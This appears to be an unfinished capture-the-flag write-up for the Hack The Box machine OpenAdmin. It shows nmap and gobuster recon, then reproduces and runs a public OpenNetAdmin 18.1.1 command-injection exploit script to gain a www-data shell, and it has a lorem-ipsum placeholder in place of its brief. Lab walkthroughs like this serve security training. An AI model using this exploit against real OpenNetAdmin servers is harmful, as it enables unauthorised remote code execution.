---
title: OpenAdmin Writeup
date: 2020-11-06 00:38:56
categories: [HTB, retired]
published: true
tags: [writeup]
---

[![Banner](https://raw.githubusercontent.com/0xsyr0/0xsyr0.github.io/master/assets/img/htb/openadmin/openadmin_info_card.jpg)](https://www.hackthebox.eu/home/machines/profile/222)

# Information@openadmin:~$

| Column                       | Detail           |
|:-----------------------------|:-----------------|
| Name                         | OpenAdmin        |
| IP                           | 10.10.10.171     |
| Points                       | 20               |
| OS                           | Linux            |
| Difficulty                   | Easy             |
| Creator                      | [dmw0ng](https://www.hackthebox.eu/home/users/profile/82600) |
| Released on                  | 4 Jan 2020       |
| Retired on                   | 2 May 2020       |

# Brief@openadmin:~$

Lorem ipsum dolor sit amet consectetur adipiscing elit sem lacinia ultricies senectus, sapien hendrerit montes hac non bibendum nec mi suscipit accumsan. Himenaeos semper dignissim dictum netus feugiat magna dictumst, blandit non pellentesque hac lacus tristique, dui egestas conubia parturient morbi dis. Dis lacinia auctor neque metus ad nisi felis vitae hac torquent, tempor et vestibulum molestie dapibus natoque sed suspendisse ullamcorper parturient, tristique proin elementum tortor pretium nullam magnis in cras.

Nulla aptent sociosqu vivamus pellentesque donec senectus venenatis, elementum mollis nam augue vulputate vel, himenaeos mus erat dui blandit mi. Parturient rhoncus at tincidunt conubia taciti feugiat metus auctor, curae integer congue elementum mi nulla mattis, facilisi placerat magnis suscipit tristique lectus dapibus. Cubilia potenti platea viverra pulvinar malesuada sagittis sodales mauris quis, sociis parturient a penatibus odio duis molestie venenatis hendrerit praesent, fames vel cras vitae nam turpis montes quisque.

# Summary

# Recon

## Nmap

```shell
$ sudo nmap -sC -sV -oA nmap 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 18:28 CEST
Nmap scan report for 10.10.10.171
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.86 seconds
```

We notice that port `22/tcp` and port `80/tcp` are open.

## Gobuster

```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/25 18:51:23 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
```

Let's check the found directories. I started with `/music`.

> http://10.10.10.171/music

After clicking on `login` i got redirected.

> http://10.10.10.171/ona/



> https://www.exploit-db.com/exploits/47691

```bash
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

```console
$ wget https://www.exploit-db.com/raw/47691
```


```console
$ chmod +x 47691.sh
```

```shell
./47691.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# Resources

<https://www.exploit-db.com/exploits/47691>
